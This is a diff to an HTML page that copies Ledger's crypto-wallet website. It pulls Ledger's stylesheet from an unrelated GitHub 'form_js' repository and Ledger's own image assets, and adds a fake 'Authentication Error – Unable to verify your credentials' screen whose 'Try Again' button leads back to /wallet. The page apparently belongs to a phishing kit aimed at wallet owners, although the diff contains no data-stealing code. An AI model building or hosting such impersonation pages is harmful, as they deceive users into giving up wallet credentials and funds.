@@ -1,7 +1,10 @@
 <!DOCTYPE html>
 <html class lang=en>
+
+<head>
     <!-- <link rel="stylesheet" href="ledger.css"> -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ajibolagenius/form_js@2c828dc90b6ea7b54c902a4762c7a7fd5ace8d24/ledger/ledger.css">
+    <link rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/ajibolagenius/form_js@2c828dc90b6ea7b54c902a4762c7a7fd5ace8d24/ledger/ledger.css">
 </head>
 
 <body class="home page-template page-template-page-home page-template-page-home-php page page-id-123"
@@ -330,11 +333,6 @@
             </div>
         </section>
 
-        <section class=bg-divider-dark>
-            <div class=row>
-                <div></div>
-            </div>
-        </section>
         <div id=newsletter class="bg prefooter-blocks">
             <div class=row>
                 <div class="row flexbox">
@@ -373,12 +371,54 @@
                 </div>
             </div>
         </div>
-        <section class=bg-divider-dark>
-            <div class=row>
-                <div></div>
-            </div>
-        </section>
+
     </main>
+
+    <!-- Error Page Start-->
+    <main id=main class="ldg-container changing-header homepage">
+        <div data-gradient=0 class=hero-manager>
+            <div class="bg bg-black introduction" id=hero>
+                <div class="row no-margin-mobile">
+                    <div class="flexbox row">
+                        <div class=content>
+                            <div class=text-container>
+                                <div class="tag purple">
+                                    <h1>Authentication Error</h1>
+                                </div>
+                                <h2 class=heading-3>Unable to verify your credentials</h2>
+                                <p class=heading-7>
+                                    We encountered an issue while processing your request. Please try again.
+                                </p>
+                            </div>
+
+                            <div class="cta-section no-info">
+                                <a href="/" title="Back to Home" class="button secondary" style=color:#ffffff>Return
+                                    Home</a>
+                                <a href="/wallet" title="Try Again" class="button primary"
+                                    style="background-color: #000; color:#ffffff; border: 1px solid #ffffff;">Try
+                                    Again</a>
+                            </div>
+                        </div>
+                        <div class=illustration-block>
+                            <div class=illustration
+                                style="background-image:url(https://ledger-wp-website-s3-prd.ledger.com/uploads/2024/10/hero.webp)">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                const homeButton = document.querySelector('a[title="Back to Home"]');
+                const baseUrl = window.location.origin;
+                homeButton.href = baseUrl;
+            });
+
+        </script>
+    </main>
+    <!-- Error Page End-->
+
 </body>
 
 </html>
